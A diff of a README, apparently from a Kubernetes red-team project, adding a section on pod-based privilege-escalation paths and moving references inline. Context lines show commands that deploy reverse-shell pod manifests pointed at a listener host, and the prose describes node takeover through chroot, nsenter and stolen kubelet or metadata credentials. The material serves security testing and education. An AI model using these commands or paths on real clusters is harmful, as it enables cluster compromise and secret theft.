@@ -39,7 +39,23 @@ hostIPC only - reverse shell | [yaml](yaml/hostipc-only/README.md) | [readme](ya
 
 # Impact - What's the worst that can happen?
 
-## Everything Allowed
+## Nothing allowed
+[nothing-allowed](yaml/nothing-allowed/README.md) 
+
+### What's the worst that can happen?
+Multiple potential paths to full cluster compromise (all resources in all namespaces)
+
+### How?
+Before I get into how to exploit specific specifications that are enabled, I wanted to cover the baseline case. If you can create a pod in a namespace, there are quite a few privesc paths available to you. I'll just list some of the most common ones here
+* If cloud hosted, try to access the cloud metadata service. You might get access to a cloud security token associated with the IAM role(s) assigned to the node), as well as access outside the cluster (i.e. buckets, databases, write access to IAM, etc.) 
+* If the apiserver or kubelet's have anonymous access set to true, and there are no network policy controls, you can interact with them directly. 
+* If the default service account is mounted to your pod and is overly permissive, you can use that token to further escalate your privs within the cluster.
+* Your pod will be able to see a different view of the network services running within the cluster than you likely can from the machine you used to create the pod. You can hunt for vulnerable services by proxying your traffic through the pod. 
+
+So, with some of those privesc paths out of the way, **for the next examples let's assume we are talking about additional escalation paths** that are specific to the enabled specifications.
+
+
+## Everything allowed
 [everything-allowed](yaml/everything-allowed/README.md) 
 
 ### What's the worst that can happen?
@@ -47,6 +63,9 @@ Multiple likely paths to full cluster compromise (all resources in all namespace
 
 ### How?
 The pod you create mounts the host's filesystem to the pod. You then exec your pod and chroot to the directory where you mounted the host's filesystem and have root on the node running your pod. One promising privesc path is available if you can schedule your pod to run on the master node (not possible in most cloud hosted k8s environment). Even if you can only schedule your pod on the worker node, you can access the node's kubelet creds, you can create mirror pods in any namespace, and you can access any secret mounted within any pod on the node you are on, and then use it to gain access to other namespaces or to create new cluster role bindings. 
+
+Reference:
+* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
  
 ## HostPID and Privileged
 [hostPID + privileged](yaml/priv-and-hostpid/README.md) 
@@ -57,6 +76,10 @@ Multiple likely paths to full cluster compromise (all resources in all namespace
 ### How?
 In this scenario, the only thing that changes is now you gain root access to the host. Rather than chrooting to the host's filesystem first, you can use nsenter to run bash in the host's PID 1 namespace, giving you a root shell on the node running your pod. Once you are root on the host, the privesc paths are all the same as described above. 
 
+References: 
+* https://twitter.com/mauilion/status/1129468485480751104
+* https://github.com/kvaps/kubectl-node-shell
+
 ## Privileged only
 [privileged=true](yaml/priv-only/README.md) 
 
@@ -65,6 +88,10 @@ Multiple likely paths to full cluster compromise (all resources in all namespace
 
 ### How?
 While can eventually get an interactive shell on the node like in the cases above, you start with non-interactive command execution and you'll have to upgrade it if you want interactive access. The privesc paths are the same as above.
+
+References: 
+* https://twitter.com/_fel1x/status/1151487051986087936
+* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
 
 
 ## hostPath only
@@ -145,14 +172,6 @@ HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostpath-only/pod-hostpath-only-re
 HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostipc-only/pod-hostipc-only-revshell.yaml | kubectl apply -f -
 HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
 ```
-
-# References
-* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
-* https://twitter.com/mauilion/status/1129468485480751104
-* https://twitter.com/_fel1x/status/1151487051986087936
-* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
-* https://github.com/kvaps/kubectl-node-shell
-
 
 # Acknowledgements 
 Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), and [Mark Manning](https://twitter.com/antitree) for publicly sharing so much knowledge about Kubernetes security. 
